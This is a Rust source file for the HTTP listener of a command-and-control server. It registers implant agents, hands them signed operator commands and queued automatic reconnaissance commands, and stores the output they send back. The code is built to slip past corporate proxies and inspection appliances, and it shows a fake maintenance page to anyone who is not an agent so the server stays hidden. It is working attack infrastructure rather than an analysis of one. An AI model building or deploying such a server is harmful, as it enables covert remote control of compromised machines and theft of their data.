// src/server/http_listener.rs
//
// HTTP(S) C2 listener. An axum-based HTTP server that handles agent
// check-ins over standard HTTP requests. This allows C2 traffic to
// traverse corporate proxies, WAFs, and SSL inspection appliances.
//
// Protocol:
//   POST /                     → Agent registration (ClientHello JSON in body)
//                                Returns session_token + queued commands
//   GET  /<profile_get_uri>    → Agent polls for commands (session_token in cookie)
//                                Returns commands or empty 200
//   POST /<profile_post_uri>   → Agent sends command responses (body = result JSON)
//
// Non-C2 traffic gets a decoy page so the listener looks like a normal web server.

use axum::{
    routing::{post, any},
    extract::{State},
    http::{StatusCode, HeaderMap},
    response::{IntoResponse, Response, Html},
    body::Bytes,
    Router,
};
use std::sync::{Arc, Mutex};
use std::collections::{HashMap, VecDeque};
use std::net::SocketAddr;
use ed25519_dalek::{SigningKey, Signer};
use base64::{Engine as _, engine::general_purpose::STANDARD as BASE64};
use chrono::Utc;
use tracing::{info, warn, error};

use crate::common::{ClientHello, SecuredCommand, CommandResponse, Session, SharedSessions};
use crate::database::{self, DbPool};
use crate::api::SharedResults;

/// Per-session state managed behind a single lock. Using one Mutex
/// instead of four separate ones ensures that multi-field updates
/// (registration inserts into all four maps) are atomic. If a thread
/// panics mid-operation, all state is consistently behind one poisoned
/// lock rather than split across some-updated, some-not maps.
pub struct HttpInner {
    pub cmd_queues: HashMap<u32, VecDeque<SecuredCommand>>,
    pub token_map: HashMap<String, u32>,
    pub signing_keys: HashMap<u32, SigningKey>,
    pub counters: HashMap<u32, u64>,
    pub next_id: u32,
    /// Recently seen auth_hmac values with their expiry time. Rejects duplicate
    /// registrations within the freshness window (prevents replay attacks from
    /// a network eavesdropper who captured a valid ClientHello).
    pub seen_hmacs: HashMap<String, chrono::DateTime<chrono::Utc>>,
}

/// Shared state for the HTTP C2 listener.
pub struct HttpC2State {
    pub sessions: SharedSessions,
    pub db: DbPool,
    pub results: SharedResults,
    pub inner: Mutex<HttpInner>,
    /// Counts how many times the inner mutex was recovered from a poison state.
    /// If this exceeds a threshold, new registrations are refused — operating
    /// on potentially corrupted state is worse than downtime.
    poison_count: std::sync::atomic::AtomicU32,
}

impl HttpC2State {
    const MAX_POISON_RECOVERIES: u32 = 3;

    pub fn new(sessions: SharedSessions, db: DbPool, results: SharedResults) -> Self {
        let start_id = if let Ok(conn) = db.get() {
            database::allocate_session_id(&conn).unwrap_or(1000)
        } else { 1000 };

        Self {
            sessions, db, results,
            inner: Mutex::new(HttpInner {
                cmd_queues: HashMap::new(),
                token_map: HashMap::new(),
                signing_keys: HashMap::new(),
                counters: HashMap::new(),
                next_id: start_id,
                seen_hmacs: HashMap::new(),
            }),
            poison_count: std::sync::atomic::AtomicU32::new(0),
        }
    }

    /// Check if the state has been poisoned too many times.
    pub fn is_degraded(&self) -> bool {
        self.poison_count.load(std::sync::atomic::Ordering::Relaxed) >= Self::MAX_POISON_RECOVERIES
    }

    fn alloc_id(&self) -> u32 {
        let mut inner = self.inner.lock().unwrap_or_else(|e| {
            tracing::error!("HttpC2State mutex poisoned during alloc_id — recovering");
            e.into_inner()
        });
        let current = inner.next_id;
        inner.next_id += 1;
        current
    }

    /// Queue a command for a session. Called when operators send commands
    /// via the API to HTTP-transported sessions.
    pub fn queue_command(&self, session_id: u32, command: String) -> u64 {
        let mut inner = self.inner.lock().unwrap_or_else(|e| {
            tracing::error!("HttpC2State mutex poisoned during queue_command — recovering");
            e.into_inner()
        });
        let counter = inner.counters.entry(session_id).or_insert(0);
        *counter += 1;
        let req_id = *counter;

        if let Some(signing_key) = inner.signing_keys.get(&session_id) {
            let mut cmd = SecuredCommand {
                session_id: "sess".to_string(),
                counter: req_id,
                nonce: rand::random(),
                timestamp: Utc::now(),
                command,
                signature: String::new(),
            };
            let sig = signing_key.sign(&cmd.get_signable_bytes());
            cmd.signature = BASE64.encode(sig.to_bytes());

            let queue = inner.cmd_queues.entry(session_id).or_default();
            // Backpressure: if an agent is offline or polling very infrequently,
            // commands pile up in memory indefinitely. Cap the queue depth to
            // prevent OOM from operators mass-queueing commands to dead sessions.
            const MAX_QUEUED_COMMANDS: usize = 256;
            if queue.len() >= MAX_QUEUED_COMMANDS {
                tracing::warn!(session_id, "Command queue full ({} pending), dropping oldest", queue.len());
                queue.pop_front();
            }
            queue.push_back(cmd);
        }

        req_id
    }

    /// Prune HTTP sessions that haven't been seen for the given duration.
    /// Without periodic cleanup, dead/restarted agents accumulate entries
    /// in token_map, signing_keys, cmd_queues, and counters indefinitely,
    /// eventually causing an OOM crash on the C2 server.
    pub fn prune_stale_sessions(&self, max_age_secs: i64) {
        let now = chrono::Utc::now().timestamp();

        // Find session IDs that haven't been seen recently
        let stale_ids: Vec<u32> = {
            let sessions = self.sessions.iter();
            sessions
                .filter(|entry| {
                    let last = entry.value().last_seen.load(std::sync::atomic::Ordering::Relaxed);
                    now - last > max_age_secs
                })
                .map(|entry| *entry.key())
                .collect()
        };

        if stale_ids.is_empty() { return; }

        let mut inner = self.inner.lock().unwrap_or_else(|e| {
            tracing::error!("HttpC2State mutex poisoned during prune — recovering");
            e.into_inner()
        });

        // Remove stale sessions from all maps. Use a HashSet for O(1) lookups
        // during the token_map retain — the old code called retain() inside a
        // for loop, creating O(N*M) complexity that blocked the mutex during
        // large cleanup cycles, freezing all HTTP C2 traffic.
        let stale_set: std::collections::HashSet<u32> = stale_ids.iter().copied().collect();
        let pruned = stale_set.len();

        for &sid in &stale_set {
            inner.cmd_queues.remove(&sid);
            inner.signing_keys.remove(&sid);
            inner.counters.remove(&sid);
        }
        // Single O(M) pass over token_map instead of N × O(M)
        inner.token_map.retain(|_, v| !stale_set.contains(v));

        // Also remove from the central SharedSessions DashMap — the old code
        // forgot this, leaking Session structs (channels, keys, metadata)
        // indefinitely until OOM.
        for &sid in &stale_set {
            self.sessions.remove(&sid);
        }

        if pruned > 0 {
            tracing::info!("Pruned {} stale HTTP sessions (>{max_age_secs}s idle)", pruned);
        }
    }
}

/// Start the HTTP C2 listener on the given port.
pub async fn start(
    state: Arc<HttpC2State>,
    port: u16,
    _use_tls: bool,
) {
    let app = Router::new()
        .route("/", post(handle_register))
        .route("/register", post(handle_register))
        .fallback(any(handle_c2_or_decoy))
        .with_state(state.clone());

    let addr = SocketAddr::from(([0, 0, 0, 0], port));
    info!(port, "HTTP C2 listener started");

    // Periodic cleanup of stale HTTP sessions. Without this, dead agents
    // accumulate entries in token_map/signing_keys/cmd_queues/counters
    // indefinitely, eventually causing OOM on the C2 server.
    let cleanup_state = state.clone();
    tokio::spawn(async move {
        let mut interval = tokio::time::interval(std::time::Duration::from_secs(300));
        loop {
            interval.tick().await;
            // Prune sessions idle for over 1 hour
            cleanup_state.prune_stale_sessions(3600);
        }
    });

    let server = axum::Server::bind(&addr)
        .serve(app.into_make_service_with_connect_info::<SocketAddr>());

    if let Err(e) = server.await {
        error!(port, error = %e, "HTTP C2 listener error");
    }
}

/// POST / — Agent registration. Receives ClientHello, returns session token.
async fn handle_register(
    State(state): State<Arc<HttpC2State>>,
    _headers: HeaderMap,
    axum::extract::ConnectInfo(addr): axum::extract::ConnectInfo<SocketAddr>,
    body: Bytes,
) -> Response {
    let hello: ClientHello = match serde_json::from_slice(&body) {
        Ok(h) => h,
        Err(_) => return decoy_page().into_response(),
    };

    // Look up build info for authentication
    let (signing_key, profile_name) = {
        let conn = match state.db.get() {
            Ok(c) => c,
            Err(_) => return StatusCode::INTERNAL_SERVER_ERROR.into_response(),
        };

        match database::get_build_info(&conn, &hello.build_id) {
            Some((key_bytes, name, _profile_json, challenge_key)) => {
                let key: [u8; 32] = match key_bytes.try_into() {
                    Ok(a) => a,
                    Err(_) => return decoy_page().into_response(),
                };

                // Verify auth_hmac if build has a challenge_key
                if let Some(ref ck) = challenge_key {
                    if hello.auth_hmac.is_empty() {
                        warn!("Missing auth_hmac from {} for build {}", addr.ip(), hello.build_id);
                        return decoy_page().into_response();
                    }

                    // Replay protection: reject registrations with stale or missing
                    // timestamps. The timestamp is included in the HMAC, so an
                    // attacker can't forge one. But an empty timestamp skipped
                    // this entire check — reject it when a challenge_key exists.
                    if hello.reg_timestamp.is_empty() {
                        warn!("Missing reg_timestamp from {} for build {} (replay attempt?)", addr.ip(), hello.build_id);
                        return decoy_page().into_response();
                    }
                    if let Ok(ts) = chrono::DateTime::parse_from_rfc3339(&hello.reg_timestamp) {
                        let age = (Utc::now() - ts.with_timezone(&Utc)).num_seconds().abs();
                        if age > 300 { // 5-minute window for clock skew
                            warn!("Stale registration timestamp ({age}s old) from {} for build {}", addr.ip(), hello.build_id);
                            return decoy_page().into_response();
                        }
                    } else {
                        warn!("Malformed reg_timestamp from {} for build {}", addr.ip(), hello.build_id);
                        return decoy_page().into_response();
                    }

                    use hmac::{Hmac, Mac};
                    use sha2::Sha256;
                    type HmacSha256 = Hmac<Sha256>;
                    // The challenge_key is stored as raw bytes (BLOB) in the DB.
                    // The agent decodes the base64 config value to get the same
                    // raw bytes. Use them directly — no decoding needed here.
                    let ck_decoded = ck.clone();
                    if let Ok(mut mac) = <HmacSha256 as Mac>::new_from_slice(&ck_decoded) {
                        // Length-prefix each field before hashing to prevent
                        // concatenation collisions. Without delimiters,
                        // build_id="12" + exe_id="345" hashes identically to
                        // build_id="123" + exe_id="45" (both produce "12345").
                        mac.update(&(hello.build_id.len() as u32).to_le_bytes());
                        mac.update(hello.build_id.as_bytes());
                        mac.update(&(hello.exe_id.len() as u32).to_le_bytes());
                        mac.update(hello.exe_id.as_bytes());
                        mac.update(&(hello.reg_timestamp.len() as u32).to_le_bytes());
                        mac.update(hello.reg_timestamp.as_bytes());
                        let received_raw = match BASE64.decode(hello.auth_hmac.as_bytes()) {
                            Ok(b) => b,
                            Err(_) => {
                                warn!("Malformed auth_hmac base64 from {} for build {}", addr.ip(), hello.build_id);
                                return decoy_page().into_response();
                            }
                        };
                        if mac.verify_slice(&received_raw).is_err() {
                            warn!("Invalid auth_hmac from {} for build {}", addr.ip(), hello.build_id);
                            return decoy_page().into_response();
                        }

                        // Replay dedup: ONLY insert after HMAC verification succeeds.
                        // The old code checked/inserted in a separate block that could
                        // be reached without HMAC validation (e.g., if challenge_key was
                        // absent but auth_hmac was non-empty). This let attackers flood
                        // the cache with garbage HMACs, triggering the overflow cap and
                        // locking out ALL legitimate agents globally.
                        let now_replay = Utc::now();
                        const PRUNE_THRESHOLD: usize = 1000;
                        {
                            let mut inner = state.inner.lock().unwrap_or_else(|e| e.into_inner());
                            if inner.seen_hmacs.len() > PRUNE_THRESHOLD {
                                inner.seen_hmacs.retain(|_, exp| *exp > now_replay);
                            }

                            if inner.seen_hmacs.contains_key(&hello.auth_hmac) {
                                warn!("Replayed auth_hmac from {} for build {}", addr.ip(), hello.build_id);
                                return decoy_page().into_response();
                            }
                            inner.seen_hmacs.insert(
                                hello.auth_hmac.clone(),
                                now_replay + chrono::Duration::seconds(310),
                            );
                        }
                    }
                }

                (SigningKey::from_bytes(&key), name)
            }
            None => {
                warn!(build_id = %hello.build_id, ip = %addr.ip(), "Unknown build ID via HTTP");
                return decoy_page().into_response();
            }
        }
    };

    let sess_id = state.alloc_id();
    let session_token = format!("{}_{}", sess_id, uuid::Uuid::new_v4());

    // Log to DB
    if let Ok(conn) = state.db.get() {
        database::log_new_session(
            &conn, &hello.exe_id, &hello.computer_id, &hello.hostname,
            &hello.os, &addr.ip().to_string(), &hello.build_id, &profile_name,
        );
    }

    // Register session in shared state
    // The tx channel is what the API uses to send commands. We bridge it
    // to the HTTP command queue via a spawned reader task.
    let (tx, mut rx) = tokio::sync::mpsc::unbounded_channel();
    let last_seen = Arc::new(std::sync::atomic::AtomicI64::new(Utc::now().timestamp()));

    state.sessions.insert(sess_id, Session {
        id: sess_id,
        computer_id: hello.computer_id,
        addr,
        hostname: hello.hostname.clone(),
        os: hello.os.clone(),
        tx,
        signing_key: signing_key.clone(),
        parent_id: None,
        last_seen: last_seen.clone(),
        interfaces: hello.interfaces.clone(),
        hibernation_mode: hello.hibernation_mode,
    });

    {
        let mut inner = state.inner.lock().unwrap_or_else(|e| {
            tracing::error!("HttpC2State mutex poisoned during registration — recovering");
            e.into_inner()
        });
        inner.token_map.insert(session_token.clone(), sess_id);
        inner.signing_keys.insert(sess_id, signing_key);
        inner.cmd_queues.insert(sess_id, VecDeque::new());
        inner.counters.insert(sess_id, 0);
    }

    // Bridge: read from the session's tx channel (fed by the API's send_command)
    // and push into the HTTP command queue for the agent to pick up on next poll.
    {
        let state_bridge = state.clone();
        tokio::spawn(async move {
            while let Some((command, callback)) = rx.recv().await {
                let req_id = state_bridge.queue_command(sess_id, command);
                if let Some(cb) = callback {
                    let _ = cb.send(req_id);
                }
            }
        });
    }

    info!(session_id = sess_id, ip = %addr.ip(), hostname = %hello.hostname, "HTTP session registered");
    println!("\n[+] HTTP Session {}: {} ({}) [{}]", sess_id, addr.ip(), hello.hostname, hello.os);

    // Queue auto-recon commands
    if let Ok(conn) = state.db.get() {
        let recon_cmds = database::get_auto_recon(&conn);
        for cmd in recon_cmds {
            state.queue_command(sess_id, cmd);
        }
    }

    // Return session token + any queued commands
    let queued = drain_commands(&state, sess_id);
    let response = serde_json::json!({
        "token": session_token,
        "commands": queued,
    });

    (StatusCode::OK, axum::Json(response)).into_response()
}

/// Fallback handler: serves C2 traffic or decoy page.
/// Agent identification is via the `X-Session-Token` header or `sid` cookie.
async fn handle_c2_or_decoy(
    State(state): State<Arc<HttpC2State>>,
    headers: HeaderMap,
    method: axum::http::Method,
    body: Bytes,
) -> Response {
    // Try to extract session token from headers or cookies
    let token = headers.get("X-Session-Token")
        .and_then(|v| v.to_str().ok())
        .or_else(|| {
            headers.get("Cookie")
                .and_then(|v| v.to_str().ok())
                .and_then(|cookies| {
                    cookies.split(';')
                        .find_map(|c| {
                            let c = c.trim();
                            c.strip_prefix("sid=")
                        })
                })
        })
        .unwrap_or("");

    let session_id = {
        let inner = state.inner.lock().unwrap_or_else(|e| {
            tracing::error!("HttpC2State mutex poisoned during poll — recovering");
            e.into_inner()
        });
        inner.token_map.get(token).copied()
    };

    let sess_id = match session_id {
        Some(id) => id,
        None => return decoy_page().into_response(),
    };

    // Update last_seen
    if let Some(session) = state.sessions.get(&sess_id) {
        session.touch();
    }

    match method {
        axum::http::Method::GET => {
            // Poll for commands
            let commands = drain_commands(&state, sess_id);
            if commands.is_empty() {
                // Return empty 200 with realistic body
                (StatusCode::OK, [("Content-Type", "application/json")],
                    "{\"status\":\"ok\",\"data\":[]}").into_response()
            } else {
                let body = serde_json::to_string(&commands).unwrap_or_default();
                (StatusCode::OK, [("Content-Type", "application/json")], body).into_response()
            }
        }
        axum::http::Method::POST => {
            // Agent sending command response
            if let Ok(resp) = serde_json::from_slice::<CommandResponse>(&body) {
                state.results.lock().unwrap_or_else(|e| e.into_inner()).insert((sess_id, resp.request_id), resp.clone());

                // Capture output before spawn_blocking moves resp
                let output_copy = resp.output.clone();

                // Persist to DB
                let db = state.db.clone();
                tokio::task::spawn_blocking(move || {
                    if let Ok(conn) = db.get() {
                        database::save_client_output(&conn, sess_id, resp.request_id, &resp.output, &resp.error);
                    }
                });

                if !output_copy.trim().is_empty() {
                    println!("\n[HTTP Sess {} Output]\n{}", sess_id, crate::utils::strip_ansi(output_copy.trim()));
                }
            }
            (StatusCode::OK, "").into_response()
        }
        _ => decoy_page().into_response(),
    }
}

/// Drain all queued commands for a session.
fn drain_commands(state: &HttpC2State, sess_id: u32) -> Vec<SecuredCommand> {
    let mut inner = state.inner.lock().unwrap_or_else(|e| {
        tracing::error!("HttpC2State mutex poisoned during drain — recovering");
        e.into_inner()
    });
    if let Some(queue) = inner.cmd_queues.get_mut(&sess_id) {
        queue.drain(..).collect()
    } else {
        Vec::new()
    }
}

/// Decoy page for non-C2 traffic. Looks like a generic corporate site.
fn decoy_page() -> Html<&'static str> {
    Html(r#"<!DOCTYPE html><html><head><title>Site Maintenance</title>
<style>body{font-family:Arial,sans-serif;display:flex;justify-content:center;align-items:center;height:100vh;margin:0;background:#f5f5f5}
.c{text-align:center;color:#666}h1{font-size:2em;color:#333}</style></head>
<body><div class="c"><h1>Under Maintenance</h1><p>This service is temporarily unavailable. Please try again later.</p></div></body></html>"#)
}
